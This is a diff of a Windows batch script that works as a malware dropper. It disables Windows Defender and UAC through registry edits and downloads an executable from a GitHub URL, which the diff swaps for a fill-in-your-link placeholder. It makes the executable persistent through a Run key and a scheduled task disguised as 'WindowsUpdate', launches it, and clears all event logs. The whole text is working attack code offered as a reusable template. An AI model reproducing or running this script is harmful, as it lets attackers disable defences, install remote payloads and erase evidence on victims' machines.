@@ -19,13 +19,12 @@ reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender" /v Dis
 reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f
 cls
 echo --------------------cerete-my-path--------------------------------------------------
-mkdir "%systemdrive%\programdata\67-Win"
+mkdir "%systemdrive%\programdata\GG-Win"
 echo ----------------------------copy-my-files-to-web-sever-------------------------------------
-PowerShell.exe (New-Object System.Net.WebClient).DownloadFile('https://github.com/Splash2520/Network/raw/refs/heads/main/Network.exe','%programdata%\67-Win\Network.exe')Add commentMore actions
+PowerShell.exe (New-Object System.Net.WebClient).DownloadFile('You link File ','%programdata%\GG-Win\Network.exe')
 echo -----------start-paylod------------------------
-REG ADD "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "WindowsPowerup" /t REG_SZ /F /D "%programdata%\67-Win\Network.exe"
-schtasks /create /tn WindowsUpdate /ru "%username%" /sc ONSTART /DELAY 0000:30  /RL HIGHEST /tr "%programdata%\67-Win\Network.exe" /f
-start %programdata%\67-Win\Network.exe
-
+REG ADD "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "WindowsPowerup" /t REG_SZ /F /D "%programdata%\GG-Win\Network.exe"
+schtasks /create /tn WindowsUpdate /ru "%username%" /sc ONSTART /DELAY 0000:30  /RL HIGHEST /tr "%programdata%\GG-Win\Network.exe" /f
+start %programdata%\GG-Win\Network.exe
 echo -----------delete-evnt-log-------------------------------------------
 for /F "tokens=*" %1 in ('wevtutil.exe el') DO wevtutil.exe cl "%1"
